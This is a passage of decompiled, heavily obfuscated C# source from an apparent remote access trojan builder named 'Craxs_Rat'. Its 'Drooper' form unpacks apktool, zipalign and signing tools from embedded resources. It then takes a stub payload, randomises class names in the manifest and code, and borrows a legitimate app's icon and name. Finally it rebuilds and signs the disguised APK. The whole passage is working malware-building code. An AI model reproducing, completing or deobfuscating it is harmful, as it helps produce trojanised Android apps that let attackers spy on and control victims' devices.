              File.WriteAllBytes(((EditSocket) this).K, Craxs_Rat.My.Resources.Resources.K2);
              this.S();
              num1 = (int) num3 * -1262842161 ^ -1791810895;
              continue;
            case 48:
              this.S();
              num1 = (int) num3 * -917368072 ^ -1233233583;
              continue;
            case 49:
              str1 = ((Editor) this).buildapkpath.Replace(EXGuarder.\u003713F2248, EXGuarder.\u00320707201);
              this.ExecuteCommand(command2);
              num1 = (int) num3 * -303686519 ^ 294874081;
              continue;
            case 50:
              goto label_1;
            case 51:
              this.log(EXGuarder.\u003100F5857);
              num1 = (int) num3 * 856787561 ^ 1278525073;
              continue;
            case 52:
              this.S();
              num1 = -1729051857;
              continue;
            case 53:
              goto label_100;
            case 54:
              Directory.CreateDirectory(((EditSocket) this).STUBPATH);
              Directory.CreateDirectory(((Editor) this).outputpath);
              num1 = (int) num3 * -764744434 ^ 140749195;
              continue;
            case 55:
              this.ExecuteCommand(EXGuarder.\u0030A125915 + ((EditSocket) this).apktoolpath + EXGuarder.\u003124A7065 + ((EditSocket) this).STUBPATH + EXGuarder.\u0031E24575A + ((Editor) this).buildapkpath);
              num1 = (int) num3 * -52168536 ^ -1508652232;
              continue;
            case 56:
              this.S();
              num1 = (int) num3 * 1373890816 ^ -916355702;
              continue;
            case 57:
              ((EditSocket) this).ClassesPath = ((EditSocket) this).STUBPATH + EXGuarder.\u00341604B11;
              newValue1 = EXGuarder.\u003634D0A27;
              num1 = (int) num3 * -433784529 ^ -182989248;
              continue;
            case 58:
              ((EditSocket) this).stubicon = ((EditSocket) this).STUBPATH + EXGuarder.\u00313462D2B;
              this.log(EXGuarder.\u003333F3C6F);
              contents2 = File.ReadAllText(((EditSocket) this).stringspath).Replace(EXGuarder.\u003294D4F25, this.textappname.Text);
              num1 = (int) num3 * -1447823511 ^ -155667369;
              continue;
            case 59:
              num1 = (int) num3 * -2012315520 ^ 1612113546;
              continue;
            case 60:
              ((EditSocket) this).stringspath = ((EditSocket) this).STUBPATH + EXGuarder.\u003631B730F;
              num1 = (int) num3 * 1868225615 ^ 1314333356;
              continue;
            case 61:
              this.log(EXGuarder.\u0031F6D4C78);
              this.S();
              this.log(EXGuarder.\u0032F43600F);
              this.S();
              num1 = (int) num3 * 391843250 ^ -1017104966;
              continue;
            case 62:
              ((Editor) this).WorkDIR = driv + EXGuarder.\u00308090365;
              ((EditSocket) this).STUBPATH = ((Editor) this).WorkDIR + EXGuarder.\u0032E713D58;
              num1 = (int) num3 * -910667487 ^ 959997426;
              continue;
            case 63:
              File.Delete(((EditSocket) this).BASEPATH);
              num1 = (int) num3 * -898241779 ^ 730631363;
              continue;
            case 64:
              ((Faker) this).N_Class2 = this.RandommMadv2(30);
              num1 = (int) num3 * -16941780 ^ -57170223;
              continue;
            case 65:
              this.S();
              this.S();
              num1 = (int) num3 * -1170089749 ^ -766583049;
              continue;
            case 66:
              ((Faker) this).N_Class5 = this.RandommMadv2(30);
              contents3 = File.ReadAllText(((EditSocket) this).MainfistPath).Replace(((EditSocket) this).ClassGen1, ((Faker) this).N_Class1).Replace(((EditSocket) this).ClassGen2, ((Faker) this).N_Class2).Replace(((EditSocket) this).ClassGen3, ((Faker) this).N_Class3).Replace(((EditSocket) this).ClassGen4, ((Faker) this).N_Class4).Replace(((Faker) this).ClassGen5, ((Faker) this).N_Class5);
              num1 = (int) num3 * -1863607632 ^ -1085579718;
              continue;
            case 67:
              ((EditSocket) this).C = ((Editor) this).WorkDIR + EXGuarder.\u003596A2656;
              num1 = (int) num3 * 40767933 ^ 2016979741;
              continue;
            case 68:
              driv = Codes.GetDriv();
              num1 = (int) num3 * -1898587886 ^ -1835013028;
              continue;
            case 69:
              num1 = (int) num3 * -1839191266 ^ 1200455916;
              continue;
            case 70:
              File.WriteAllBytes(((EditSocket) this).apktoolpath, Craxs_Rat.My.Resources.Resources.apktool);
              File.WriteAllBytes(((EditSocket) this).Apksignerpath, Craxs_Rat.My.Resources.Resources.signapk);
              num1 = (int) num3 * 1162984190 ^ -1673690390;
              continue;
            case 71:
              File.Delete(str3);
              this.log(EXGuarder.\u003300B6B49);
              num1 = (int) num3 * -1779815512 ^ 538232239;
              continue;
            case 72:
              checked { ++num4; }
              num1 = (int) num3 * -352392471 ^ 1465188871;
              continue;
            case 73:
              int num14;
              num1 = num14 = ((Faker) this).firsttry ? -745015677 : (num14 = 92280152);
              continue;
            case 74:
              ((EditSocket) this).ApkZIPpath = ((Editor) this).WorkDIR + EXGuarder.\u003705F5646;
              num1 = (int) num3 * -1843913352 ^ 1455189082;
              continue;
            case 75:
              index = 0;
              num1 = (int) num3 * -1018492952 ^ 658306904;
              continue;
            case 76:
              this.log(EXGuarder.\u0035F40323B);
              ((Editor) this).assetspath = ((EditSocket) this).STUBPATH + EXGuarder.\u003390B1C1E;
              ((EditSocket) this).BASEPATH = ((Editor) this).assetspath + EXGuarder.\u003294E0062;
              int num15 = !File.Exists(((EditSocket) this).BASEPATH) ? 942764608 : (num15 = 1257760109);
              num1 = num15 ^ (int) num3 * 196833120;
              continue;
            case 77:
              File.WriteAllText(path, contents1);
              num1 = (int) num3 * 436556495 ^ -1406875968;
              continue;
            case 78:
              command2 = ((EditSocket) this).ApkZIPpath + EXGuarder.\u003545D250C + ((Editor) this).buildapkpath + EXGuarder.\u003036B3F0D + ((Editor) this).buildapkpath.Replace(EXGuarder.\u003713F2248, EXGuarder.\u00320707201) + EXGuarder.\u003626D6D6E;
              num1 = (int) num3 * 1972109147 ^ 1549463354;
              continue;
            case 79:
              this.log(EXGuarder.\u00341301A12);
              num1 = (int) num3 * 976338936 ^ 1585764196;
              continue;
            case 80:
              command1 = EXGuarder.\u0030A125915 + ((EditSocket) this).Apkeditorpath + EXGuarder.\u00318193949 + str1 + EXGuarder.\u003626D6D6E;
              num1 = (int) num3 * -1030511187 ^ -330458900;
              continue;
            case 81:
              Directory.CreateDirectory(((Editor) this).WorkDIR);
              num1 = (int) num3 * 227339596 ^ -568053449;
              continue;
            case 82:
              File.Copy(((Editor) this).TargetApkicon, ((EditSocket) this).stubicon);
              num1 = (int) num3 * -200061045 ^ 632607360;
              continue;
            case 83:
              newValue2 = this.RandommMadv2(30);
              num1 = -241008974;
              continue;
            case 84:
              File.WriteAllBytes(((EditSocket) this).ApkZIPpath, Craxs_Rat.My.Resources.Resources.zipalign);
              num1 = (int) num3 * 859496589 ^ 262982467;
              continue;
            case 85:
              this.S();
              num1 = 210266250;
              continue;
            case 86:
              str5 = EXGuarder.\u0030B201536;
              str6 = EXGuarder.\u003493F3224;
              num1 = (int) num3 * 1330263791 ^ 1228436028;
              continue;
            case 87:
              File.Delete(((EditSocket) this).STUBPATH + EXGuarder.\u00350423E54);
              num1 = (int) num3 * 766492500 ^ 1207240245;
              continue;
            case 88:
              str4 = ((Editor) this).outputpath + EXGuarder.\u0032A1E736C + ((Editor) this).originalapkname.Replace(EXGuarder.\u003430F0E64, EXGuarder.\u0034B05382E);
              command3 = EXGuarder.\u0032D2B253C + ((EditSocket) this).Apksignerpath + EXGuarder.\u003541F5815 + ((EditSocket) this).K + EXGuarder.\u0035B085F4A + ((EditSocket) this).C + EXGuarder.\u003353C2712 + str4 + EXGuarder.\u003036B3F0D + str3 + EXGuarder.\u003626D6D6E;
              num1 = (int) num3 * -504471385 ^ -366302738;
              continue;
            case 89:
              File.WriteAllText(((EditSocket) this).ClassesPath + EXGuarder.\u0032A1E736C + newValue2 + EXGuarder.\u003403F5972, str2.Replace(EXGuarder.\u00330550B2F, newValue1).Replace(EXGuarder.\u0035F66096B, str5 + EXGuarder.\u0032C512E34 + str6).Replace(EXGuarder.\u0034C6D554F, newValue2));
              num1 = (int) num3 * -1662433124 ^ -70651116;
              continue;
            case 90:
              ((EditSocket) this).MainfistPath = ((EditSocket) this).STUBPATH + EXGuarder.\u00378324838;
              num1 = (int) num3 * 1925095375 ^ -259819838;
              continue;
            default:
              goto label_97;
          }
        }
label_100:
        return;
label_97:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        if (!Codes.MyMsgBox(EXGuarder.\u0035E37786A, exception.Message, false, Craxs_Rat.My.Resources.Resources.error48px))
          goto label_99;
label_95:
        int num16 = -1706129381;
label_96:
        while (true)
        {
          int num17 = num16;
          uint num18;
          switch ((num18 = (uint) (1883163502 - (--(num17 - -194766007 * ~(-1994871076 * 176051461 ^ 1185469973 * -1016221760) * -180678181) ^ 1656671395 * (819456667 - 105603819) ^ -2030635500 - 1885205705))) % 4U)
          {
            case 0:
              goto label_99;
            case 1:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__113\u002D1)));
              num16 = (int) num18 * 1057551999 ^ 669538901;
              continue;
            case 2:
              goto label_95;
            case 3:
              goto label_93;
            default:
              goto label_3;
          }
        }
label_93:
        return;
label_3:
        return;
label_99:
        ProjectData.ClearProjectError();
        num16 = -371553231;
        goto label_96;
      }
    }

    private void StopCommandPrompt()
    {
      try
      {
        if (((Editor) this).cmdProcess == null)
          return;
label_1:
        int num1 = -758062703;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(-~(num1 - -535587719 * ~1578546142 + (~(1417395907 * 27328436) - ~(2022744947 * -22921906 ^ ~-642199249))) - ~39755866)) % 5U)
          {
            case 0:
              ((Editor) this).cmdProcess.CloseMainWindow();
              ((Editor) this).cmdProcess.Close();
              ((Editor) this).cmdProcess.Dispose();
              num1 = (int) num2 * -641918082 ^ 724138474;
              continue;
            case 1:
              this.ExecuteCommand(EXGuarder.\u0033E442A2D);
              this.S();
              num1 = (int) num2 * -428721375 ^ -521737928;
              continue;
            case 2:
              ((Editor) this).cmdProcess = (Process) null;
              num1 = (int) num2 * -1763861028 ^ 566345753;
              continue;
            case 3:
              goto label_11;
            case 4:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_11:
        return;
label_7:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_9:
        int num3 = 2126755147;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) ~(-~(num3 - -535587719 * ~1578546142 + (~(1417395907 * 27328436) - ~(2022744947 * -22921906 ^ ~-642199249))) - ~39755866)) % 3U)
          {
            case 0:
              goto label_9;
            case 1:
              goto label_3;
            case 2:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * 11259213 ^ -1477051222;
              continue;
            default:
              goto label_14;
          }
        }
label_3:
        return;
label_14:;
      }
    }

    public string RandommMadv2(int minCharacters)
    {
      string str1 = EXGuarder.\u0035B097321;
      if (((Faker) this).rshit != null)
        goto label_4;
label_1:
      int num1 = -1659899618;
label_2:
      string str2;
      string str3;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 ^ (-1698470021 * -302330059 - -1016453795 * -2057502121 ^ 1215477320 - 282059911 ^ 1235626368 - -124734201) - (-1722795556 ^ (457324652 ^ 1306417903) - ~548148625) - ~(-(-146611762 - -639012070) + (-160622005 - -1832130643))) * 427520375 ^ (-548878368 ^ 1784845437) + --131385300)) % 9U)
        {
          case 0:
            num1 = (int) num2 * 1828480731 ^ 238738655;
            continue;
          case 1:
            str3 = str2.ToString().ToLower() + Conversions.ToString(((Faker) this).cou);
            num1 = (int) num2 * 1361567115 ^ 1221918617;
            continue;
          case 2:
            goto label_1;
          case 3:
            int num3;
            num1 = num3 = str2.Length < minCharacters ? -1881908703 : (num3 = -657482576);
            continue;
          case 4:
            ((Faker) this).rshit = new Random();
            num1 = (int) num2 * 45913486 ^ 660419438;
            continue;
          case 5:
            goto label_4;
          case 6:
            // ISSUE: variable of a reference type
            int& local;
            // ISSUE: explicit reference operation
            int num4 = checked (^(local = ref ((Faker) this).cou) + 1);
            local = num4;
            num1 = (int) num2 * 1387132713 ^ 532257057;
            continue;
          case 8:
            str2 += Conversions.ToString(str1[((Faker) this).rshit.Next(0, checked (str1.Length - 1))]);
            num1 = 1652471764;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str3;
label_4:
      str2 = EXGuarder.\u00322793817;
      num1 = 737460838;
      goto label_2;
    }

    private void ExecuteCommand(string command)
    {
      ((Editor) this).cmdProcess.StandardInput.WriteLine(command);
label_1:
      int num1 = -789939402;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(num1 * 1795705931 + -(-1191938751 * 2106451081 ^ -152293313 - 1698875627 ^ ~563409156))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            ((Editor) this).cmdProcess.StandardInput.Flush();
            num1 = (int) num2 * -1668327969 ^ 82674856;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void cmdOutputHandler(object sender, DataReceivedEventArgs e)
    {
      if (string.IsNullOrEmpty(e.Data))
        return;
label_1:
      int num1 = -354256875;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string data;
        switch ((num3 = (uint) ~(-1335814503 - ~--~num2)) % 19U)
        {
          case 0:
            goto label_21;
          case 1:
            int num4;
            num1 = num4 = !data.StartsWith(EXGuarder.\u00372346746) ? -704336176 : (num4 = -464557013);
            continue;
          case 2:
            this.log(data);
            num1 = (int) num3 * 1267837098 ^ 1368381148;
            continue;
          case 3:
            int num5;
            num1 = num5 = !data.Contains(EXGuarder.\u0034F0C5070) ? 206061411 : (num5 = -894630345);
            continue;
          case 4:
            goto label_1;
          case 5:
            this.log(data);
            num1 = (int) num3 * 1877556391 ^ -1119131608;
            continue;
          case 6:
            this.log(data.Replace(EXGuarder.\u00372346746, EXGuarder.\u003705E730C));
            num1 = (int) num3 * 344134599 ^ -36312985;
            continue;
          case 7:
            int num6;
            num1 = num6 = !(data.Contains(EXGuarder.\u0035C657107) | data.Contains(EXGuarder.\u00337712D0A)) ? -1197529424 : (num6 = -819927194);
            continue;
          case 8:
            this.log(data.Replace(EXGuarder.\u00363535B03, EXGuarder.\u00365541317));
            num1 = (int) num3 * -2092569836 ^ -1370696293;
            continue;
          case 9:
            ((Faker) this).FoundJava = true;
            num1 = (int) num3 * 327246637 ^ 1930266001;
            continue;
          case 10:
            ((Faker) this).Waitbuild = false;
            num1 = (int) num3 * 1811834515 ^ -545313734;
            continue;
          case 11:
            int num7 = ((Faker) this).FoundJava ? 933092208 : (num7 = -1666898247);
            num1 = num7 ^ (int) num3 * -1826204976;
            continue;
          case 12:
            int num8;
            num1 = num8 = !data.Contains(EXGuarder.\u0030B69072D) ? -652644499 : (num8 = -1211373894);
            continue;
          case 13:
            int num9 = data.Contains(EXGuarder.\u0031F337532) ? -1137091699 : (num9 = -778851838);
            num1 = num9 ^ (int) num3 * 1753011239;
            continue;
          case 14:
            data = e.Data;
            int num10 = !data.Contains(EXGuarder.\u003654C6859) ? 1401842037 : (num10 = -2006164922);
            num1 = num10 ^ (int) num3 * 1368125581;
            continue;
          case 15:
            ((Faker) this).Waitprotect = false;
            num1 = (int) num3 * -1439300126 ^ 1939711737;
            continue;
          case 16:
            int num11;
            num1 = num11 = !data.StartsWith(EXGuarder.\u00363535B03) ? 4047327 : (num11 = -822489993);
            continue;
          case 17:
            ((Faker) this).HoldExtract = false;
            num1 = (int) num3 * 832468665 ^ 1920672376;
            continue;
          case 18:
            int num12;
            num1 = num12 = !data.Contains(EXGuarder.\u00301221E48) ? -53063815 : (num12 = -132906936);
            continue;
          default:
            goto label_22;
        }
      }
label_21:
      return;
label_22:;
    }

    private void Drooper_FormClosing(object sender, FormClosingEventArgs e)
    {
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u003100B5A30, false) == 0)
        goto label_7;
label_1:
      int num1 = -170868949;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~(~(num1 - (((-1403839427 * 1992513351 ^ --69691948) - ~(538734422 - -445153332) ^ ~(~709150061 ^ 1501201230)) + ~-(-1587485465 - --259187977))) - -(-1448330549 * 494518054 - (-1023043847 - 502077096)) - 825752199 * ~-116573746)) % 8U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -972487357 ^ -164778108;
            continue;
          case 2:
            Codes.MyMsgBox(EXGuarder.\u0030503004D, EXGuarder.\u0034F636979, false, Craxs_Rat.My.Resources.Resources.information48px);
            num1 = (int) num2 * -676968014 ^ -1541354698;
            continue;
          case 3:
            Codes.MyMsgBox(EXGuarder.\u0030503004D, EXGuarder.\u0036F5B4F65, false, Craxs_Rat.My.Resources.Resources.information48px);
            num1 = -635277658;
            continue;
          case 4:
            int num3 = Operators.CompareString(language, EXGuarder.\u00377286D19, false) == 0 ? 1617155576 : (num3 = 139361001);
            num1 = num3 ^ (int) num2 * -552279015;
            continue;
          case 5:
            num1 = (int) num2 * -597125134 ^ -2059552259;
            continue;
          case 6:
            goto label_1;
          case 7:
            goto label_7;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:
      return;
label_7:
      Codes.MyMsgBox(EXGuarder.\u0030503004D, EXGuarder.\u0036519003F, false, Craxs_Rat.My.Resources.Resources.information48px);
      num1 = 1173569959;
      goto label_2;
    }

    private void Translateme()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = 1581333531;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(-num1 * -285820365)) % 11U)
        {
          case 0:
            this.selectapkbtn.Text = EXGuarder.\u003764C2D01;
            this.labelname.Text = EXGuarder.\u0035D0F6B1A;
            this.Button1.Text = EXGuarder.\u00379073908;
            num1 = (int) num2 * 1716198306 ^ -260058790;
            continue;
          case 1:
            num1 = (int) num2 * -564078849 ^ 1669213586;
            continue;
          case 2:
            int num3 = Operators.CompareString(language, EXGuarder.\u003760C0235, false) == 0 ? -1008042628 : (num3 = 1621777070);
            num1 = num3 ^ (int) num2 * -1943512169;
            continue;
          case 3:
            this.selectapkbtn.Text = EXGuarder.\u0032436166E;
            this.labelname.Text = EXGuarder.\u00370590476;
            num1 = 1819027461;
            continue;
          case 4:
            this.Button3.Text = EXGuarder.\u00322250F71;
            num1 = (int) num2 * -682762471 ^ 2082006233;
            continue;
          case 5:
            this.Button1.Text = EXGuarder.\u0036B583306;
            num1 = (int) num2 * 20543369 ^ -1022125291;
            continue;
          case 6:
            goto label_3;
          case 7:
            this.Button2.Text = EXGuarder.\u0031C2E5C1F;
            num1 = (int) num2 * -1912169559 ^ -2062273550;
            continue;
          case 8:
            this.Button3.Text = EXGuarder.\u00317523F17;
            this.Button2.Text = EXGuarder.\u003695A5245;
            num1 = (int) num2 * -688265584 ^ 707425405;
            continue;
          case 9:
            int num4 = Operators.CompareString(language, EXGuarder.\u00306095D4F, false) != 0 ? -1945406634 : (num4 = -1599714254);
            num1 = num4 ^ (int) num2 * -934495874;
            continue;
          case 10:
            goto label_1;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    private void Drooper_Load(object sender, EventArgs e) => this.Translateme();

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern Drooper(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      object[] objs,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void addLogback(object[] objs);
  }
}
